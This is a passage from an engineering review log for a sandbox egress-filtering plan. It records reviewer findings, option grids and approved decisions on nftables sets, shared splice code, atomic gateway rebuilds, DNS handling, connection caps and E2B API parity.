In `pkg/api/e2b/handlers.go`, drop `allowOut` when `denyOut` is empty, so the request has no restriction (E2B semantics). Table test plus a release note, because existing facade behavior loosens.

State: approved
Actual answer: A) Keep stricter, document (D11, answered 2026-10-05)
Accepted scope: No code change. The new egress docs page states that the E2B facade treats `allowOut` without `denyOut` as an allowlist (stricter than E2B), and that `allowOut` plus `denyOut ["0.0.0.0/0"]` is the portable form.
History: none

### A8: nft design for deny-list-mode FQDN sandboxes (necessary work under D4)
Finding: A8, P1, confidence 9/10, plan §5.2 forward chain "everything else → drop" and §5.1 "FQDN mode = the allowlist has at least one hostname entry". Reviewer plan-eng-review (Claude). D4 allows hostname allow entries together with a partial deny list (deny-list mode with allow exceptions, default accept). The §5.2 table assumes every FQDN source defaults to drop.
Plan baseline: §5.2 as written.
Runtime evidence: design-level.
State: approved (necessary implementation of the D4 contract; no separate question)
Actual answer: covered by D4 B) Full E2B precedence
Accepted scope: The gateway records a per-sandbox default verdict. The nft table carries two source sets (`fqdn_src_deny_default`, `fqdn_src_accept_default`; both are members of the redirect set) plus a `deny_cidr` set keyed `ipv4_addr . ipv4_addr` (interval). Forward order: established accept, `allow_cidr` accept, `allow_learned` accept, `deny_cidr` drop, then drop only for `fqdn_src_deny_default`. The proxy evaluates allow (host or CIDR), then deny CIDR on the resolved IP, then the sandbox default. The DNS filter answers non-allowlisted names with NXDOMAIN only in allowlist mode; deny-list mode forwards them, so DNS filtering protects allowlist-mode sandboxes only, and the docs say so.
History: none

### Q-CQ4: The second isolate matcher is dead code (factual correction)
Finding: CQ4, P3, confidence 9/10, `internal/runtime/isolate/egress.go:25-74` (`egressAllowed`, `hostMatches`). Its only callers are its own tests (`internal/runtime/isolate/egress_test.go:19-24`); production enforcement is `pkg/isolate/egress.go:223,287`. Reviewer plan-eng-review (Claude).
State: recorded (no behavior change)
Accepted scope: §5.6 changes from "replacing the two copies" to "replace `pkg/isolate/egress.go`'s matcher with `pkg/egresspolicy`, and delete the unused `internal/runtime/isolate` copy together with its test". `policyFromCreate` stays.
History: none

### CQ1: Share one fixed splice between the L4 wake proxy and the egress proxy
Finding: CQ1, P2, confidence 9/10, reviewer plan-eng-review (Claude).
- `internal/service/l4proxy.go:143-163`, `spliceConns`. Its doc reads "Bytes already buffered in br (read past a PROXY header, or a peeked ClientHello) are written upstream FIRST", and it keeps raw-conn splice(2). It then returns on the first `<-done` and closes both sides.
- That return is the half-close bug in TODOS.md "L4 splice drops the response after a client half-close".
- Existing caller: `internal/service/l4wake.go:236`. Proposed caller: the egress proxy (plan §5.5 step 4, "Replay the buffered hello and splice both directions"), which has the same contract.
- Accounting (estimates): about 35 implementation lines move to a shared package and the proxy writes none of its own. The half-close fix adds about 15 lines. Tests: `TestSpliceConnsWritesBufferedPrefixFirst` moves with the code, plus one new half-close test.
- Blast radius: L4 wake connections change to wait for both directions, which is the TODO's intended fix.
Plan baseline: original proposal; §5.5 implies a new splice inside the proxy.
Runtime evidence: code read.
Comparison grid:

| Choice | Current (plan) | A | B | C |
|---|---|---|---|---|
| CQ1 splice implementation for the egress proxy | new splice written inside `internal/egress/proxy` | move `spliceConns` to `internal/netsplice`, fix half-close there (both directions, `CloseWrite`, idle timeout); `l4wake.go` and the egress proxy both use it; closes the TODO | the egress proxy writes its own correct splice; `l4proxy.go` and its TODO untouched | the egress proxy calls the existing `spliceConns` as-is (bug included) |
| D2-D11 decisions | approved | unchanged | unchanged | unchanged |

Question D12:
D12 — Should the egress proxy and the L4 wake proxy share one fixed splice helper?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§5.5 proxy, code quality), branch fix/go-race-coverage-tests.
ELI10: After the proxy reads the TLS hello, it must send those buffered bytes upstream first and then copy data both ways. The repo already has exactly that function for its L4 wake proxy (internal/service/l4proxy.go:143), including the fast kernel-splice path. But it has a known bug: when a client finishes sending and half-closes, the function hangs up before the response arrives (TODOS.md). Sharing it means fixing that bug once for both proxies.
Stakes if we pick wrong: a copied or unfixed splice drops responses for clients that half-close (netcat, some database and RPC clients), now in two places.
Recommendation: Extract and fix because the contracts are identical, the fix closes an existing TODO, and there is then one splice to test.
Completeness: A=10/10, B=8/10, C=4/10
Pros / cons:
A) Extract and fix (recommended)
  ✅ One tested splice for both proxies; the L4 half-close TODO closes in the same change
  ✅ The egress proxy keeps splice(2) zero-copy without re-deriving the trick (human: ~4h / CC: ~30min)
  ❌ Touches the L4 wake path, so its half-close behavior changes in this plan's PR stack
B) Separate correct splice
  ✅ L4 wake proxy is untouched; the egress proxy's splice is correct from day one
  ✅ No cross-feature coupling between ingress and egress code
  ❌ Two splice implementations to maintain, and the L4 bug stays open
C) Reuse as-is
  ✅ Zero new splice code; the proxy calls the existing helper directly
  ✅ No change to L4 wake behavior at all
  ❌ The egress proxy inherits the half-close bug and drops responses for half-closing clients
Net: same contract, one known bug; fix it once where both callers route through.
Header: Splice
Options:
A) Extract and fix (recommended)
Move `spliceConns` and `proxyCopyAndCloseWrite` to a new `internal/netsplice` package. Fix half-close there: wait for both directions, `CloseWrite` on each EOF, with an idle timeout so a silent peer cannot pin goroutines. `internal/service/l4wake.go` and `internal/egress/proxy` both call it. `TestSpliceConnsWritesBufferedPrefixFirst` moves with it, and a new half-close test is added. Closes the TODOS.md entry "L4 splice drops the response after a client half-close".
B) Separate correct splice
`internal/egress/proxy` gets its own splice (buffered prefix first, both directions, idle timeout) with its own tests. `internal/service/l4proxy.go` and its TODO are untouched.
C) Reuse as-is
`internal/egress/proxy` calls the existing `spliceConns` (moved or exported as needed) without fixing half-close. Document the limitation.

State: approved
Actual answer: A) Extract and fix (D12, answered 2026-10-05)
Accepted scope: Move `spliceConns` and `proxyCopyAndCloseWrite` to a new `internal/netsplice` package. Fix half-close there: wait for both directions, `CloseWrite` on each EOF, with an idle timeout so a silent peer cannot pin goroutines. `internal/service/l4wake.go` and `internal/egress/proxy` both call it. `TestSpliceConnsWritesBufferedPrefixFirst` moves with it, and a new half-close test is added. Closes the TODOS.md entry "L4 splice drops the response after a client half-close".
History: none

### CQ2: Gateway set rebuild must never pass through an empty state
Finding: CQ2, P1, confidence 8/10, plan line 287 "On boot the gateway flushes its sets and rebuilds them from local store rows". Reviewer plan-eng-review (Claude). Under D9 the gateway is its own process. For FQDN sandboxes, membership in the source sets is the only thing that redirects them and applies their default drop: netrules installs no `sbx-egress` rules for them, and the driver's temporary block was cleared after Attach. Any window between flush and rebuild therefore leaves those sandboxes unrestricted (fail-open). The window also opens if the gateway restarts before it has a policy snapshot. nftables applies a netlink batch as one transaction, so a flush and its re-add can be atomic.
Plan baseline: original §5.3 restart bullet (flush, then rebuild).
Runtime evidence: design-level.
Comparison grid:

| Choice | Current (plan) | A | B |
|---|---|---|---|
| CQ2 set rebuild on gateway start | flush sets, then rebuild | rebuild is one atomic nft transaction (flush and re-add in the same batch); with no snapshot loaded, the gateway leaves kernel sets untouched until sandboxd's full sync arrives; regression test asserts membership is never empty mid-rebuild | unchanged (flush then rebuild) |
| D9 separate process, D5 owner-checked Detach | approved | unchanged | unchanged |

Question D13:
D13 — Make the gateway's rebuild atomic so a restart can't briefly unblock sandboxes?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§5.3 restart, D9 process), branch fix/go-race-coverage-tests.
ELI10: Hostname-filtered sandboxes are kept in check only by being listed in the gateway's firewall sets. The plan says that on startup the gateway empties those sets and then refills them. In the gap, those sandboxes are not listed, so nothing restricts them. The kernel can swap the old list for the new one in a single step, and the gateway can simply leave the kernel lists alone until it knows the full set.
Stakes if we pick wrong: every gateway restart opens a short window where allowlisted sandboxes have unrestricted internet.
Recommendation: Atomic replace because the kernel already supports one-step swaps, so failing closed costs nothing.
Completeness: A=10/10, B=3/10
Pros / cons:
A) Atomic replace (recommended)
  ✅ Sandbox membership never passes through empty; a restart cannot open egress even briefly
  ✅ Uses nftables' native transaction batches, plus one regression test (human: ~3h / CC: ~20min)
  ❌ The gateway must hold the full desired state before its first write, so the startup ordering is stricter
B) Flush then rebuild
  ✅ Simplest startup code: clear everything, then add back from the snapshot
  ✅ No need to diff or batch the rebuild
  ❌ Each gateway restart leaves FQDN sandboxes unrestricted until the rebuild finishes
Net: one batched write turns a fail-open window into nothing.
Header: Rebuild
Options:
A) Atomic replace (recommended)
On start, the gateway loads its persisted policy snapshot (written with temp file, fsync and rename) or waits for sandboxd's full sync. Only then does it replace every set's contents in a single nft transaction (flush and re-add in the same netlink batch). With no snapshot it leaves the existing kernel sets untouched. Regression test with the nft backend fake: membership is never observed empty during a rebuild. The same atomic replace is used for sandboxd's full re-sync after sandboxd restarts.
B) Flush then rebuild
Keep the plan's restart bullet: flush the sets, then add entries back from the snapshot or store rows. Document the restart window.

State: approved
Actual answer: A) Atomic replace (D13, answered 2026-10-05)
Accepted scope: On start, the gateway loads its persisted policy snapshot (written with temp file, fsync and rename) or waits for sandboxd's full sync. Only then does it replace every set's contents in a single nft transaction (flush and re-add in the same netlink batch). With no snapshot it leaves the existing kernel sets untouched. Regression test with the nft backend fake: membership is never observed empty during a rebuild. The same atomic replace is used for sandboxd's full re-sync after sandboxd restarts.
History: none

### CQ3: Warm-adopted containerd sandboxes may have no usable resolver
Finding: CQ3, P2, confidence 6/10 (medium confidence: verify this is actually an issue). Reviewer plan-eng-review (Claude).
- Parked containers mount only toolboxd and the ready socket (`internal/runtime/containerd/warm_park.go:179-182`), and `warm_adopt.go` adds no resolv.conf. So an adopted sandbox uses whatever `/etc/resolv.conf` its image ships.
- If the image ships none (common, because Docker usually generates it), glibc and musl fall back to 127.0.0.1. Queries then never leave the netns, the gateway's port-53 redirect never sees them, and the FQDN sandbox has no DNS.
- That outcome is fail-closed but broken. Cold creates are fine: they bind-mount a generated resolv.conf (`lifecycle.go:614`).
Plan baseline: not addressed (plan assumes a non-loopback nameserver).
Runtime evidence: mount list read in code; live behavior not probed (medium confidence).
Comparison grid:

| Choice | Current | A | B |
|---|---|---|---|
| CQ3 resolv.conf on warm-adopted containerd sandboxes | image's own (possibly absent → 127.0.0.1) | park-time spec bind-mounts a generated resolv.conf (host upstreams, loopback stubs stripped, same generator as `hosts.go:52`) for every parked container; integration UC: warm-adopted sandbox resolves DNS, with and without FQDN mode | bounded investigation first: one live containerd warm-pool run checks `getent hosts` in an adopted sandbox; the fix stays pending until the result is in |
| D2-D11 | approved | unchanged | unchanged |

Question D14:
D14 — Give warm-adopted containerd sandboxes a generated resolv.conf, or verify the gap first?
Project/branch/task: eng review of plans/egress-domain-filtering.md (warm path DNS), branch fix/go-race-coverage-tests.
ELI10: Normally created containerd sandboxes get a resolv.conf that points at real DNS servers. Sandboxes taken from the warm pool do not get one; they use whatever the image ships. If the image ships none, the system falls back to asking itself (127.0.0.1), which never leaves the sandbox. The gateway catches DNS only when it leaves the sandbox, so hostname-filtered warm sandboxes would have no DNS at all. I read this in the code but have not watched it fail live.
Stakes if we pick wrong: hostname filtering works on cold creates and silently breaks DNS on warm-pool creates, which looks flaky.
Recommendation: Mount at park time because it matches the cold path, costs one bind mount, and works whether or not the gap shows up live.
Completeness: A=10/10, B=7/10
Pros / cons:
A) Mount resolv.conf at park time (recommended)
  ✅ Warm and cold creates resolve DNS the same way, with or without FQDN mode
  ✅ Reuses the existing resolv.conf generator, plus one integration UC (human: ~3h / CC: ~20min)
  ❌ Changes the parked container spec, so already-parked slots need a pool refresh to pick it up
B) Investigate first
  ✅ One live warm-pool run confirms whether images really fall back to 127.0.0.1
  ✅ Avoids a spec change if containerd or the images already cover it
  ❌ The fix stays undecided until someone runs the check on a containerd host
Net: the cold path already does this; matching it on the warm path is cheap insurance.
Header: Warm DNS
Options:
A) Mount resolv.conf at park time (recommended)
Parked containerd containers bind-mount a generated resolv.conf (same generator as `internal/runtime/containerd/hosts.go:52`, keyed by slot ID, cleaned up with the slot). Adopted sandboxes therefore resolve DNS like cold creates. Integration UC: a warm-adopted sandbox resolves DNS with and without FQDN mode.
B) Investigate first
Run one live containerd warm-pool check (`getent hosts` in an adopted sandbox from a stock image) before deciding. No code change is approved; the fix stays pending until the result is recorded.

State: approved
Actual answer: A) Mount resolv.conf at park time (D14, answered 2026-10-05)
Accepted scope: Parked containerd containers bind-mount a generated resolv.conf (same generator as `internal/runtime/containerd/hosts.go:52`, keyed by slot ID, cleaned up with the slot). Adopted sandboxes therefore resolve DNS like cold creates. Integration UC: a warm-adopted sandbox resolves DNS with and without FQDN mode.
History: none

### T1: Isolate regression contract (IRON RULE)
Finding: T1, P1 (regression risk), confidence 9/10, reviewer plan-eng-review (Claude). Existing isolate behavior that this plan changes:
- `pkg/isolate/egress.go:223-240` checks deny before allow. `pkg/isolate/egress_test.go:27` pins this: `{Allow: [".example.com"], Deny: ["bad.example.com"]}` on host `bad.example.com` → false.
- Isolate creates skip `validateEgressPolicy` (`internal/service/service.go:1723` vs `:1836`), so hostname entries in deny lists are accepted today and enforced by the plaintext proxy.
D4 (allow-wins) flips the first. §5.1 plus P0-3 (isolate entries validated by `pkg/egresspolicy`, which rejects hostnames in deny lists) turn the second into a create-time 400.
Plan baseline: scope accepted as-is (§5.1 grammar, P0-3) + D4 approved; no explicit regression contract for isolate.
Runtime evidence: code and tests read.
Comparison grid:

| Choice | Current | A | B |
|---|---|---|---|
| T1a isolate precedence with both lists | deny wins | allow wins (D4) | allow wins (D4) |
| T1b isolate hostname entries in `denyOut` | accepted, enforced by proxy | rejected at create with 400 (unified grammar) | still accepted and enforced on isolate only (runtime-aware validation) |
| Preserved behavior | — | block-all; empty allow = allow all; exact and `.suffix` allow; CIDR on IP literals; case-insensitive; SSRF literal + dial-time blocks; observer attribution | same |
| Acceptance assertions | — | rewrite `egress_test.go:27` to allow-wins; new: isolate create with hostname deny → 400; every other existing row unchanged; release note | rewrite `:27` to allow-wins; new: hostname deny still enforced on isolate, rejected on other runtimes; every other row unchanged |

Question D15:
D15 — Regression contract for existing isolate sandboxes: reject hostname deny lists, or keep them on isolate only?
Project/branch/task: eng review of plans/egress-domain-filtering.md (isolate migration onto pkg/egresspolicy), branch fix/go-race-coverage-tests.
ELI10: Isolate sandboxes already have hostname filtering, and two of their rules change under this plan. First, when a destination matches both lists, deny wins today and allow will win (you approved that in D4). Second, isolate currently accepts hostnames in the deny list. The new shared grammar rejects those, the way E2B does, because on containers a hostname deny is easy to bypass. On isolate it actually works, because every request goes through a proxy that reads the hostname. The contract decides whether those existing isolate requests start failing with 400.
Stakes if we pick wrong: either existing isolate users get 400s on creates that worked yesterday, or the grammar grows a runtime-specific exception to maintain.
Recommendation: Unified grammar, reject because isolate is off by default with no recorded users, and one grammar everywhere is simpler to explain and test.
Note: options differ in kind, not coverage — no completeness score.
Pros / cons:
A) Unified grammar, reject (recommended)
  ✅ One grammar for every runtime and the E2B facade; hostnames are allow-only everywhere
  ✅ Matches E2B, which also rejects domains in deny lists (human: ~2h / CC: ~15min)
  ❌ Existing isolate creates that list hostnames in denyOut start failing with 400
B) Keep on isolate only
  ✅ No existing isolate create breaks; the deny-by-name feature that already works survives
  ✅ Isolate keeps a capability containers cannot offer safely
  ❌ Validation becomes runtime-aware, and the docs must explain a per-runtime difference
Net: simplicity and E2B parity against keeping a working isolate-only feature.
Header: Isolate deny
Options:
A) Unified grammar, reject (recommended)
Isolate moves onto `pkg/egresspolicy` with allow-wins precedence. Hostname entries in `denyOut` are rejected at create with a 400 naming the entry. Preserved and asserted unchanged: block-all; empty allow = allow all; exact and `.suffix` allow; CIDR on IP literals; case-insensitive matching; SSRF literal and dial-time blocks; observer attribution. Tests: rewrite `pkg/isolate/egress_test.go:27` to allow-wins; add an isolate create with hostname deny → 400. Release note on the docs page.
B) Keep on isolate only
Isolate moves onto `pkg/egresspolicy` with allow-wins precedence, but validation is runtime-aware: hostname entries in `denyOut` stay accepted and enforced on isolate and are rejected elsewhere. Same preserved behaviors. Tests: rewrite `:27` to allow-wins; add hostname deny still enforced on isolate; add hostname deny → 400 on a container runtime.

State: approved
Actual answer: A) Unified grammar, reject (D15, answered 2026-10-05)
Accepted scope: Isolate moves onto `pkg/egresspolicy` with allow-wins precedence. Hostname entries in `denyOut` are rejected at create with a 400 naming the entry. Preserved and asserted unchanged: block-all; empty allow = allow all; exact and `.suffix` allow; CIDR on IP literals; case-insensitive matching; SSRF literal and dial-time blocks; observer attribution. Tests: rewrite `pkg/isolate/egress_test.go:27` to allow-wins; add an isolate create with hostname deny → 400. Release note on the docs page.
History: none

### T2: Live integration coverage depth for FQDN mode
Finding: T2, P2, confidence 8/10, reviewer plan-eng-review (Claude). Plan goal G1 claims docker, containerd and gVisor. Each engine's packets meet a different firewall setup:
- containerd: `aerolvm0` + `AEROLVM-USER`;
- docker: `docker0` + `DOCKER-USER` + dockerd's own FORWARD DROP policy;
- gVisor: runsc netstack behind the veth.
The plan's EF UCs do not name engines. The harness already has containerd single-node, docker local-mode and `cluster-3-mixed-docker` scenarios (memory: containerd is the default engine, local mode stays docker). Separately: whether nf_tables NAT coexists with iptables-legacy NAT on a legacy host is unverified (appendix finding, confidence 4).
Plan baseline: EF-01..32 without engine assignment.
Runtime evidence: harness scenario list from repo memory; not re-read.
Comparison grid:

| Choice | Current (plan) | A | B | C |
|---|---|---|---|---|
| T2 engines covered by FQDN integration UCs | unspecified | containerd + docker + gVisor scenarios (UCs gated by a new `CapEgressFQDN`), plus one iptables-legacy host probe | containerd + docker | containerd only |

Question D16:
D16 — Which engines must the live FQDN-mode integration tests cover?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§7 use cases, integration-tests/suite), branch fix/go-race-coverage-tests.
ELI10: Unit tests use a fake firewall, so only live runs prove the real packet path. That path differs by engine: containerd and Docker use different bridges and firewall chains, Docker adds its own default-drop rule, and gVisor runs its own network stack. Each extra engine is another scenario run on real AWS machines.
Stakes if we pick wrong: a firewall interaction that only happens on one engine ships untested, and hostname filtering silently fails open or breaks there.
Recommendation: All three engines + legacy probe because the plan promises all three, and each has a different firewall interaction that mocks cannot show.
Completeness: A=10/10, B=8/10, C=6/10
Pros / cons:
A) All three engines + legacy probe (recommended)
  ✅ Every engine the plan promises is proven live, including dockerd's FORWARD DROP interplay
  ✅ The iptables-legacy probe settles whether nf_tables NAT coexists on older hosts (human: ~2 days / CC: ~3h)
  ❌ Three scenario runs per verification cost AWS time and money each round
B) containerd + docker
  ✅ Covers the default engine and local mode, the two most-used paths
  ✅ Reuses existing scenarios with no gVisor run (human: ~1.5 days / CC: ~2h)
  ❌ gVisor's netstack path and legacy-iptables hosts stay unproven
C) containerd only
  ✅ Cheapest: one scenario, the default engine
  ✅ Fastest feedback loop while building Phase 1
  ❌ docker local mode and gVisor ship without live proof of the firewall interplay
Net: the plan claims three engines; prove three, or narrow the claim.
Header: Itest depth
Options:
A) All three engines + legacy probe (recommended)
Add FQDN UCs (EF-01..EF-19, EF-31) gated by a new `CapEgressFQDN` capability and run them in the containerd single-node, docker local-mode and a gVisor scenario. Add one probe on an iptables-legacy host that the nf_tables redirect and the legacy NAT coexist. Reports per engine in integration-tests/reports.
B) containerd + docker
Same UCs and capability, run in the containerd single-node and docker local-mode scenarios only. gVisor and iptables-legacy coexistence stay unverified and are documented as such.
C) containerd only
Same UCs, run in the containerd single-node scenario only. Docker local mode, gVisor and iptables-legacy stay unverified and are documented as such.

State: approved
Actual answer: A) All three engines + legacy probe (D16, answered 2026-10-05)
Accepted scope: Add FQDN UCs (EF-01..EF-19, EF-31) gated by a new `CapEgressFQDN` capability and run them in the containerd single-node, docker local-mode and a gVisor scenario. Add one probe on an iptables-legacy host that the nf_tables redirect and the legacy NAT coexist. Reports per engine in integration-tests/reports.
History: none

### PF1: The egress proxy has no per-sandbox connection cap
Finding: PF1, P2, confidence 8/10, plan §5.5 (no limit on concurrent proxied connections). Reviewer plan-eng-review (Claude). Each connection holds two goroutines plus a hello buffer of up to 16 KB while peeking, and file descriptors in the egressd process. One sandbox opening tens of thousands of connections can exhaust the node's gateway (fds, memory) and cut egress for every other FQDN sandbox on the node. The L4 wake proxy already solves this with `connLimiter`, a per-key and global cap whose hooks run under its lock (`internal/service/l4proxy.go:80-135`, used at `internal/service/l4wake.go:245-246`). Scale: per-node connections, unknown today; bounded only by fds.
Plan baseline: original proposal, no cap.
Runtime evidence: code read for `connLimiter`; proxy is proposed.
Comparison grid:

| Choice | Current (plan) | A | B |
|---|---|---|---|
| PF1 proxy connection caps | none | move `connLimiter` into `internal/netsplice` next to the D12 splice; the proxy caps per sandbox (`SB_EGRESS_PROXY_MAX_CONNS_PER_SANDBOX`, default 512) and per node (`SB_EGRESS_PROXY_MAX_CONNS`, default 16384); over the cap → immediate close + rate-limited `reason=conn_cap` denial audit | no cap; rely on fd limits |
| D12 shared splice package | approved | unchanged | unchanged |

Question D17:
D17 — Cap concurrent proxied connections per sandbox, reusing the L4 proxy's limiter?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§5.5 proxy, performance), branch fix/go-race-coverage-tests.
ELI10: Every web connection from a hostname-filtered sandbox passes through one gateway process per node. Nothing in the plan stops one sandbox from opening tens of thousands of connections, which would use up the gateway's file handles and memory and cut web access for every other sandbox on that node. The repo already has a small per-sandbox and global connection limiter for its L4 proxy, and it fits here directly.
Stakes if we pick wrong: one noisy or malicious sandbox can take down egress for all its neighbours.
Recommendation: Reuse connLimiter with caps because it is tested code with the right shape, and a cap turns a node-wide outage into one sandbox's problem.
Completeness: A=10/10, B=4/10
Pros / cons:
A) Reuse connLimiter with caps (recommended)
  ✅ One sandbox can no longer exhaust the node's gateway; neighbours keep egress
  ✅ Reuses tested per-key and global limiter code, moved next to the shared splice (human: ~3h / CC: ~20min)
  ❌ Two new config knobs, and a sandbox that legitimately needs more than 512 connections must have its limit raised
B) No cap
  ✅ No new configuration or limiter wiring in the proxy
  ✅ No legitimate workload is ever cut off by a cap
  ❌ A single sandbox can exhaust file descriptors and memory for the whole node's egress
Net: a per-sandbox cap is cheap isolation between tenants sharing one gateway.
Header: Conn caps
Options:
A) Reuse connLimiter with caps (recommended)
Move `connLimiter` from `internal/service/l4proxy.go` to `internal/netsplice` (with the D12 splice); `l4wake.go` keeps using it unchanged. The egress proxy acquires per sandbox ID and globally. New flags: `SB_EGRESS_PROXY_MAX_CONNS_PER_SANDBOX` (default 512) and `SB_EGRESS_PROXY_MAX_CONNS` (default 16384), with rows in `setup/config-defaults.md`. Over the cap the connection is closed immediately and a rate-limited `reason=conn_cap` denial is audited. Tests: per-sandbox cap, global cap, release on close.
B) No cap
No connection limit in the proxy; rely on process fd limits. Document the noisy-neighbour risk.

State: approved
Actual answer: A) Reuse connLimiter with caps (D17, answered 2026-10-05)
Accepted scope: Move `connLimiter` from `internal/service/l4proxy.go` to `internal/netsplice` (with the D12 splice); `l4wake.go` keeps using it unchanged. The egress proxy acquires per sandbox ID and globally. New flags: `SB_EGRESS_PROXY_MAX_CONNS_PER_SANDBOX` (default 512) and `SB_EGRESS_PROXY_MAX_CONNS` (default 16384), with rows in `setup/config-defaults.md`. Over the cap the connection is closed immediately and a rate-limited `reason=conn_cap` denial is audited. Tests: per-sandbox cap, global cap, release on close.
History: none

### PF2: A netlink write on every DNS answer for `host:port` rules
Finding: PF2, P2, confidence 7/10, plan §5.4 "For each A record, add `(src, ip, port)` to `allow_learned` … **before** sending the answer". Reviewer plan-eng-review (Claude). Every allowed answer for a name with a port rule costs one synchronous netlink transaction on the DNS answer path. Repeat lookups of the same name, which are common because resolvers and tools re-query often, rewrite elements that already exist. netrules hit this exact head-of-line problem when one shared `nftables.Conn` plus a mutex serialized every IP; it was fixed with per-operation conns (commit `348b21f3`). Scale: up to `SB_EGRESS_DNS_QPS` (50) × FQDN sandboxes per node answers/s in the worst case; unknown real rate.
Plan baseline: original §5.4 learned-insert step (kept in Phase 1 by D2).
Runtime evidence: design-level; prior netrules incident from git history.
Comparison grid:

| Choice | Current (plan) | A | B |
|---|---|---|---|
| PF2 learned-insert write path | one netlink write per allowed answer | the gateway keeps a shadow map of learned elements with expiry and skips the write while the existing element has more than half its timeout left; writes use per-operation nftables conns (no global mutex), as in `348b21f3`; a microbenchmark records answers/s with and without the cache | unchanged (write every answer) |
| D2 learned-IP path + fixes, D5 owner-checked Detach | approved | unchanged | unchanged |

Question D18:
D18 — Skip redundant firewall writes on repeat DNS answers and avoid a global netlink lock?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§5.4 DNS filter, performance), branch fix/go-race-coverage-tests.
ELI10: For non-web port rules like github.com:22, each DNS answer opens a short-lived firewall entry, and the plan writes it to the kernel before replying. Tools ask for the same name over and over, so most of those writes refresh entries that are already there. If all writes also share one lock, every sandbox's DNS waits behind every other sandbox's writes. netrules hit that exact lock problem before and fixed it with one connection per operation.
Stakes if we pick wrong: DNS for hostname-filtered sandboxes slows down under load, which shows up as slow or flaky package installs.
Recommendation: Shadow-map cache + per-op conns because it removes most writes from the DNS path and repeats a fix this repo already proved.
Completeness: A=10/10, B=6/10
Pros / cons:
A) Shadow-map cache + per-op conns (recommended)
  ✅ Repeat answers skip the kernel write, so the DNS path stays fast under heavy re-querying
  ✅ No global netlink lock; mirrors the per-op conn fix from 348b21f3 (human: ~4h / CC: ~30min)
  ❌ The shadow map must stay in sync with kernel timeouts, and is rebuilt in the D13 atomic replace
B) Write every answer
  ✅ Simplest code: the kernel set is the only source of truth
  ✅ No cache to keep in sync after restarts
  ❌ One netlink write per answer, which head-of-line blocks if writes share a lock
Net: cache what the kernel already knows; never serialize every sandbox behind one lock.
Header: DNS writes
Options:
A) Shadow-map cache + per-op conns (recommended)
The gateway keeps a shadow map of learned elements (src, ip, port → expiry) and skips the netlink write while the existing element has more than half its timeout left. Every set write uses its own nftables conn (no global mutex), as in commit 348b21f3. The shadow map is rebuilt in the D13 atomic replace and pruned on Detach (D5). A microbenchmark records answers/s with and without the cache. Tests: a repeat answer within the half-life issues no write; past it, one refresh write.
B) Write every answer
Keep §5.4 as written: one synchronous netlink write per allowed answer for `host:port` rules. Document the DNS-path cost.

State: approved
Actual answer: A) Shadow-map cache + per-op conns (D18, answered 2026-10-05)
Accepted scope: The gateway keeps a shadow map of learned elements (src, ip, port → expiry) and skips the netlink write while the existing element has more than half its timeout left. Every set write uses its own nftables conn (no global mutex), as in commit 348b21f3. The shadow map is rebuilt in the D13 atomic replace and pruned on Detach (D5). A microbenchmark records answers/s with and without the cache. Tests: a repeat answer within the half-life issues no write; past it, one refresh write.
History: none

### TD1: E2B facade `updateNetwork`
Finding: TD1, P2, confidence 8/10, reviewer plan-eng-review (Claude). E2B exposes `updateNetwork` / `update_network`, which "replaces the current egress configuration" (docs.e2b.dev/network/internet-access, fetched 2026-10-05). The plan's Phase 2 adds `PUT /v1/sandboxes/{id}/network/policy` with the same replace semantics, but no `/e2b` route, so an E2B SDK `updateNetwork` call against AerolVM would fail. E2B's exact REST path for it is not recorded in the repo.
Plan baseline: Phase 2 = P2-1..P2-4 (v1 endpoint, 5 SDKs, CLI/MCP, docs); no facade route.
Runtime evidence: external docs; facade routes not re-read for this.
Comparison grid:

| Choice | Current (plan) | A | B | C |
|---|---|---|---|---|
| TD1 E2B `updateNetwork` support | none | TODOS.md entry | skip | new Phase 2 item P2-5: an `/e2b` route mapped onto `Service.UpdateNetworkPolicy` with the D4 mapping, after confirming E2B's REST path from its OpenAPI spec |

Question D19:
D19 — Add E2B's updateNetwork to the facade in Phase 2, or track it as a TODO?
Project/branch/task: eng review of plans/egress-domain-filtering.md (Phase 2, E2B facade), branch fix/go-race-coverage-tests.
ELI10: E2B users can change a running sandbox's network rules with updateNetwork, which replaces the whole rule set. Phase 2 builds exactly that operation for our own API, but not the matching E2B-compatible route, so an E2B SDK call to updateNetwork would fail against AerolVM. The route is a thin mapping onto the same service call; E2B's exact URL still needs checking against its API spec.
Stakes if we pick wrong: E2B users migrating to AerolVM hit a missing endpoint the first time they tighten a sandbox's rules live.
Recommendation: Build in Phase 2 because the service call already exists in Phase 2, so the facade route is a thin mapping with real parity value.
Note: options differ in kind, not coverage — no completeness score.
Pros / cons:
A) Add to TODOS.md
  ✅ Captured with context, without growing Phase 2
  ✅ Can wait until an E2B user actually asks for live updates
  ❌ E2B SDK updateNetwork calls fail until someone picks it up
B) Skip
  ✅ No facade work and no API-shape research at all
  ✅ Keeps the facade at create-time network options only
  ❌ A known E2B parity gap with no record of it anywhere
C) Build in Phase 2 (recommended)
  ✅ E2B users get live network updates the same day native users do
  ✅ Thin route over Service.UpdateNetworkPolicy plus facade tests (human: ~4h / CC: ~30min)
  ❌ Needs E2B's REST path confirmed from its OpenAPI spec before coding
Net: the hard part ships in Phase 2 anyway; the facade route is the cheap last mile.
Header: E2B update
Options:
A) Add to TODOS.md
New TODOS.md entry "E2B facade updateNetwork" with What, Why, Pros, Cons, Start (`pkg/api/e2b/routes`, `Service.UpdateNetworkPolicy`) and Depends on (Phase 2 P2-1).
B) Skip
No entry and no route. The facade stays create-time only for network options.
C) Build in Phase 2 (recommended)
New Phase 2 item P2-5: confirm E2B's `updateNetwork` REST path from its OpenAPI spec, add the `/e2b` route mapped onto `Service.UpdateNetworkPolicy` with the D4 allow/deny mapping and the D11 allowOut-only rule, plus facade tests (replace semantics, idempotent repeat, deny-all mapping).

State: approved
Actual answer: C) Build in Phase 2 (D19, answered 2026-10-05)
Accepted scope: New Phase 2 item P2-5: confirm E2B's `updateNetwork` REST path from its OpenAPI spec, add the `/e2b` route mapped onto `Service.UpdateNetworkPolicy` with the D4 allow/deny mapping and the D11 allowOut-only rule, plus facade tests (replace semantics, idempotent repeat, deny-all mapping).
History: none

### TD2: Event-driven rule clears on a recycled IP (pre-existing, netrules)
